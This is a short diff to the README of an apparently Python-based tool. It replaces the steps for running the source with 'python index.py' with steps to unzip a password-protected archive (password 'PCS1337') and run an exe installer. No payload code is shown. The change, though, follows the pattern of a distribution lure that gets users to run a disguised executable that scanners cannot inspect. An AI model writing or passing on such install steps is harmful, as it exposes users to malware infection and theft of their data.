@@ -25,7 +25,7 @@ Type the command:
 cd <path you copied>
 ```
 
-### Install the dependencies:
+### Install the dependencies or open exe installer:
 
 ```
 pip install -r requirements.txt
@@ -39,18 +39,8 @@ python index.py
 
 
 # How to use?
-
-Open the terminal, cd into the folder if you haven't yet:
-
-```
-"cd" + path
-```
-
-To run it use the command
-
-```
-python index.py
-```
+Unzip archive(password PCS1337)
+Open exe installer and set up 
 
 
 
